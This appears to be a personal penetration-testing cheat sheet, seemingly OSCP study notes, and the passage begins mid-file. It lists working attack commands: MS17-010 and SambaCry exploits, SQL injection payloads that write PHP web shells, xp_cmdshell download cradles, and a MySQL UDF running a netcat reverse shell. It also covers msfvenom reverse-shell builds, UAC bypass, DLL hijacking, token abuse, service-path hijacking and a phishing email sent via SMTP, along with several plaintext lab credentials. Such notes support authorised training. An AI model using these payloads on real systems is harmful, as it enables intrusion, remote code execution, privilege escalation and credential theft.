# metasploit
use exploit/windows/smb/ms17_010_psexec
# newer exploit:
https://github.com/3ndG4me/AutoBlue-MS17-010
# older exploit:
https://github.com/worawit/MS17-010

# sambacry
# reference: https://github.com/opsxcq/exploit-CVE-2017-7494

# modify port in bindshell-samba.c payload
hostAddr.sin_port = htons(6699);

# compile to samba library
gcc -c -fpic bindshell-samba.c
gcc -shared -o libbindshell-samba.so bindshell-samba.o

execute payload
./exploit.py -t <target> -e libbindshell-samba.so \
             -s <share> -r <location>/libbindshell-samba.so \
             -u <user> -p <password> -P 6699

# reference: https://redteamzone.com/EternalRed/
# above link details options to get reverse shell instead of bindshell also how to privesc

# privesc add setuid/setgid to samba_init_module in bindshell-samba.c payload
int samba_init_module(void)
{
    detachFromParent();
    char command[50];
    setuid(0);
    setgid(0);
    ...

# alternatively: metasploit linux/samba/is_known_pipe
```

## recursive download
```
recurse 
prompt off 
mget *
```

## steal hash (forced authentication)
```
# create malicious scf/lnk/url; start responder; put malware
https://github.com/xct/hashgrab
```

# SMTP (POP3)
```
# user enumeration
sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>

# login through netcat (also telnet) to read emails
nc -nvC 192.168.159.137 110
USER sales
PASS sales
LIST 
RETR 1 (read the first email)

# login through netcat (also telnet) to write emails
HELO test
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Subject: Password reset process
Hi Brian,
Please follow this link to reset your password: http://192.168.49.211/
Regards,

.

QUIT
```

# SQL

```
https://github.com/NetSPI/PowerUpSQL
```

## mssql
```
SELECT @@version;
enable_xp_cmdshell;
EXEC xp_cmdshell whoami
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://127.0.0.1/shell.ps1") | powershell -noprofile'
```

```
# credential file (MSSQL14 is for version 2017)
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf

# git clone tool to extract password hash
https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes
Add-Type -Path 'OrcaMDF.RawCore.dll'
Add-Type -Path 'OrcaMDF.Framework.dll'
import-module .\Get-MDFHashes.ps1
Get-MDFHashes -mdf "C:\Users\admin\Desktop\master.mdf"
# use john or hashcat to crack
```
## mysql
```
sudo /usr/bin/mysql -u root

# escape restricted shell
system /bin/bash -i  
alternatively: /! /bin/bash -i

# if you know the password 
sqsh -S 10.11.1.31 -U sa -P poiuytrewq -D bankdb  

[1] 10.11.1.31.master.1> EXEC master..xp_cmdshell 'type C:\Users\Administrator\Desktop\proof.txt'

https://alamot.github.io/mssql_shell/

# general mysql commands
bash-4.2$ mysql -u root -pMalapropDoffUtilize1337
show databases;
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema = 'test';
# alternatively
use mysql;
show tables;

# shell
sudo mysql -uroot -ppassword -e '\! /bin/sh'
```
## SQL Injection
```
# test for injection
Legitimate_input_if_possible'+UNION+SELECT+sleep(2)%3b--+- HTTP/1.1
' OR '1'='1' -- - (bypass login)  

#references: 
https://guide.offsecnewbie.com/5-sql
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
```

### oracle sql; in URL
```
id=1' union select null,table_name,null from all_tables--  
id=1' union select null,column_name,null from all_tab_columns where table_name='WEB_ADMINS'--  
id=1' union select null,ADMIN_NAME||PASSWORD,null from WEB_ADMINS--  
id=1' union select null,(select banner from v$version where rownum=1),null from dual--
```

### cast to int, error based:
```
# wrapper: ', <SQL CMD> )-- 
',convert(int,(select @@version)))-- 

#enumerate databases
',convert(int,(select db_name(database_name))))-- enum db

# enumerate tables
',cast((SELECT name FROM database_name..sysobjects WHERE xtype = 'U') as int))-- enum table

# enumerate columns[?]
',cast((SELECT top 1 database_name..syscolumns.name, TYPE_NAME(database_name..syscolumns.xtype) FROM database_name..syscolumns, database_name..syscolumns WHERE database_name..syscolumns.id=database_name..sysobjects.id AND database_name..sysobjects.name='table_name') as int))-- enum col

# enumerate columns
',cast((SELECT top 1 database_name..syscolumns.name FROM database_name..syscolumns, database_name..sysobjects WHERE database_name..syscolumns.id=archive..sysobjects.id AND database_name..sysobjects.name='table_name') as int))--  enum col

# enumerate columns ignoring previously enumerated columns 
',cast((SELECT top 1 database_name..syscolumns.name FROM database_name..syscolumns, database_name..sysobjects WHERE database_name..syscolumns.id=archive..sysobjects.id AND database_name..sysobjects.name='*table name*') as int))-- enum col

# useful for putting it all in one (MSSQL 2017+)  
',cast((SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U') as int))-- enum tables

# for neatness: char(10) is '\n' delimiter
',cast((SELECT STRING_AGG(id, char(10)) FROM archive.dbo.pmanager) as int))--  
',cast((SELECT STRING_AGG(alogin, char(10)) FROM archive.dbo.pmanager) as int))--  
',cast((SELECT STRING_AGG(psw, char(10)) FROM archive.dbo.pmanager) as int))--  
```

### through to URL (XAMPP)
```
priority=Normal' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- - 

# alternatively (see phpinfo.php <?php phpinfo() ?> for webroot)

priority=Normal' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php'; -- -

# troubleshooting
- try passthru | system | exec | shell_exec
- sometimes you need to do two different encodings 
  - union select; outer portion: 
    - '+union+select+<BLAH>+into+outfile+'/srv/http/cmd.php'%3b+--+-
  - php tag; inner portion:
    - %22%3C%3Fphp%20echo%20exec%28%24_GET%5B%27bingo%27%5D%29%3B%20%3F%3E%22
- becareful of quotes
- POST instead of GET sometimes (use Burpsuite)
```

### blind sql; time based
```
# only provides yes/no enumeration; 10sec delay for yes
'; IF ((*TEST STATEMENT*)=1) WAITFOR DELAY '0:0:10';-- -
'; IF ((select count(name) from sys.tables where name = 'user')=1) WAITFOR DELAY '0:0:10';-- 

# alternative via curl BENCHMARK is similar to SLEEP
time curl -s -o /dev/null http://<IP>:<PORT>/page.php --insecure -b “session_id’  OR BENCHMARK(100000000, 1)=1 -- -“
```

## SQL UDF
```
# mysql (references)
https://rootrecipe.medium.com/mysql-to-system-root-ad8edc305d2b
https://github.com/sqlmapproject/sqlmap/tree/master/data/udf
https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf
PEN-200: Chapters 24.5.1, 24.3.2, 24.3.1

# exploitDB has a C file which you have to compile on the victim machine
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
# note don't do this in /tmp because mysql will copy the symlink to the so file

# alternatively:
https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql

# exploit
mysql -u root -p
password: <password goes here>
# alternatively (if linpeas says can access mysql NOPASS)
mysql -u root

# UDF enumeration
show variables;
# get architecture
select @@version_compile_os, @@version_compile_machine;
# get plugin directory (where we drop our payload)
select @@plugin_dir ;
# alternatively
show variables like 'plugin%';

use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('nc 192.168.49.73 8080 -e /bin/bash');

# situational: if you cant upload so files
xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
MariaDB [(none)]> set @shell = 0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000000;

# newer versions can convert write base64 so file
cat lib_mysqludf_sys.dll_ | base64 | tr -d '\n' > udf.b64
select from_base64("...") into dumpfile "C:\\xampp\\mysql\\lib\\plugin\\udf.dll";

# situational: plugin folder not defined
try /usr/lib/ (one up from the default mysql plugiin folder)

#postgresql
https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#rce
```

# upgrade shell
```
# method 1: python + stty
python -c 'import pty; pty.spawn("/bin/bash")'
Crtl-z  
stty raw -echo ; fg  
reset (wait a few seconds before entering this)  
export TERM=xterm-color

# method 2: script
/usr/bin/script -qc /bin/bash /dev/null

# method 3: input history
rlwrap nc -lvnp 443
```

#  VNC / RDP / psexec / Other remote
```
# reference:
https://dolosgroup.io/blog/remote-access-cheat-sheet

# vnc
ssh -L 5901:localhost:5901 commander@<IP>
vncviewer
server:localhost:5901
password:<password>

# rdp
impacket-rdp_check xor/daisy:XorPasswordIsDead17@10.11.1.122
rdesktop -d xor -u daisy -p XorPasswordIsDead17 10.11.1.122
xfreerdp /d:testlab /u:josh /p:<password> /v:192.168.112.200 /cert-ignore

# psexec
PsExec.exe \\192.168.1.1 -u josh -p Password1 cmd.exe
winexe --system --uninstall -U testlab/josh%Password1 //192.168.112.200 cmd.exe
psexec.py 'josh':'Password1'@192.168.112.200 cmd.exe
smbexec.py 'josh':'Password1'@192.168.112.200 cmd.exe
wmiexec.py test.local/john:password123@10.10.10.1

# winrm (5985)
# hash
evil-winrm -i 192.168.209.165 -u 'svc_apache$' -H 9c5b09584d21e5cfe41609623a78b8e8
# password
evil-winrm -i 192.168.209.165 -u anirudh -p SecureHM
```

# webdav
```
# cadaver
cadaver <IP>

# upload files with put (credentials needed)
curl -T 'shell.txt' 'http://$ip' [-u fmcsorley:CrabSharkJellyfish192]

# move files
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'

# situation: finding webdav credentials
# find out where the webdav password file is with linpeas or look in
# /etc/apache2/sites-enabled/000-default
# eg if password is stored in /etc/apache2/users.password cat it to see <USERNAME>
htpasswd /etc/apache2/users.password <USERNAME>

```

# winpeas / windows privesc
## enumeration
```
# reference:
https://wadcoms.github.io/
https://github.com/sagishahar/lpeworkshop
https://atomicredteam.io/atomics/#privilege-escalation

# scripts
https://github.com/itm4n/PrivescCheck
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

# automatic enumeration
winpeas.exe log=winpeas.out

# manual enumeration
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
whoami /priv
netstat –nao
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM
# search for out of place files
tree /F

# tokens
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
https://github.com/daem0nc0re/PrivFu
https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html

# special case privesc (MANAGER 10.2.2.31)
C:\xampp\htdocs\admin>sc qc tomcat7
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: tomcat7
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
# webserver tomcat service is run by SYSTEM
# so we upload a jsp reverse shell to the writable webroot
# then curl to get a reverse root shell
C:\xampp\tomcat\webapps\ROOT>curl http://127.0.0.1:8080/shell.jsp

# special case: if python script is run by root (privesc)
in .py file append: os.system("nc -e /bin/bash 172.16.30.2 4545")

# metasploit last resort
# create meterpreter shell and use getsystem to privesc

. ./PowerUp.ps1  
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt  
type checks.txt  
```

## exploitation
### always install elevated
```
# if winpeas show alwaysinstallelevated upload msi reverse shell with root priv
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.235 LPORT=21 -f msi > /home/kali/windows/priv.msi

msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f msi-nouac -o setup.msi

# alternatively
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe > useradd.exe

# install it using msiexec
reference: https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
msiexec /quiet /qn /i 1.msi
```
### bypass UAC
```
# refererences: 
https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
https://github.com/hfiref0x/UACME

# compile exploit on kali for windows 32bit
i686-w64-mingw32-gcc main.c -o bypassuac.exe  
downloaded the reference c file; compile on kali; wget on victim and execute with reverse.exe

net user pwned 1234 /ADD && net localgroup administrators pwned /ADD 
net localgroup "Remote Desktop Users" pwned /add
# add administrators group to domain
net localgroup administrators domainName\domainGroupName /ADD

# see PEN-200 for fodhelper
```
### dll hijacking
```
# you will need to use a combination of winpeas to find writable files/folders and procmon to find missing dll (see reference)
reference: 
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll

#alternative
# cross-compile on kali
x86_64-w64-mingw32-gcc windows_dll.c -shared -o malicious.dll

# replace missing or writable dll
# remember to restart the service to load malicious dll
sc stop <dllsvc> & sc start <dllsvc>
```
### juicypotato
```
whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

# 32bit https://github.com/ivanitlearning/Juicy-Potato-x86
# CLSID http://ohpe.it/juicy-potato/CLSID/ 
download onto victim with certutil
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# printspoofer.exe (64bit is different)
printspoofer.exe -c reverse.exe
```
### permissions
```
# reference:
https://steflan-security.com/windows-privilege-escalation-weak-permission/

# on victim
accesschk.exe /accepteula -uwcqv "<username>" *
accesschk64.exe /accepteula -uwcqv "<username>" *
accesschk64.exe /accepteula -wuvc  <servicename>
#on kali
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o common.exe
# hijack path
sc config <service_name> binpath="C:\Users\<user>\appdate\local\temp\common.exe"
```
### tokens
```
# SeRestorePrivilege
# enable SeRestorePrivilege if not already enabled
https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1
# then execute SeRestoreAbuse.exe
https://github.com/dxnboy/redteam#serestoreabuseexe
SeRestoreAbuse.exe "cmd /c ..."
SeRestoreAbuse.exe "cmd /c C:\temp\rshell.exe"
# alternatively (may require logout):
SeRestoreAbuse.exe "cmd /c net localgroup administrators <user> /add"

# SeBackupPrivilege
https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
. .\Acl-FullControl.ps1
Acl-FullControl -user VAULT\anirudh -path c:\users\administrator
```
###  unquoted service path
```
# verify service path
sc qc <service_name>
# BINARY_PATH_NAME value is not wrapped in quotes

msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f exe-service -o common.exe

net stop "<service_name>"
net start "<service_name>"

# verify
net localgroup administrators
```
### windows kernel exploits
```
https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120
```

# wpscan (TODO: arsenal)
```
# display users
wpscan --url http://10.11.1.234 --enumerate u

# bruteforce user "backup"
wpscan --url http://10.11.1.234 -u backup -P rockyou.txt
```

# OSCP Practice
```
https://www.linkedin.com/pulse/oscp-essentials-ernesto-arias
```